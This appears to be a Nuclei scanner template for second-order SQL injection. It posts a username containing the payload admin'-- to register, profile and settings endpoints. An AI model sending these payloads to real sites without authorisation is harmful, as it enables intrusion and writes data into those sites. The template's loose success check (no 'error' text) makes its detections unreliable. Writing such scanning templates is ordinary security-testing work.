id: m7-sqli-second-order
info:
  name: M7 - Second-Order SQL Injection Detection
  author: Sharlix
  severity: high
  description: Detects second-order SQLi via stored payloads that execute on retrieval
  tags: sqli,second-order,stored,m7hunter

requests:
  - method: POST
    path:
      - "{{BaseURL}}/register"
      - "{{BaseURL}}/profile/update"
      - "{{BaseURL}}/settings"
      - "{{BaseURL}}/api/user"

    body: "username=admin'--&email=test@test.com&password=Pass@123"
    headers:
      Content-Type: application/x-www-form-urlencoded

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 || status_code == 201 || status_code == 302"
          - "!contains(body, 'error') && !contains(body, 'invalid')"
        condition: and
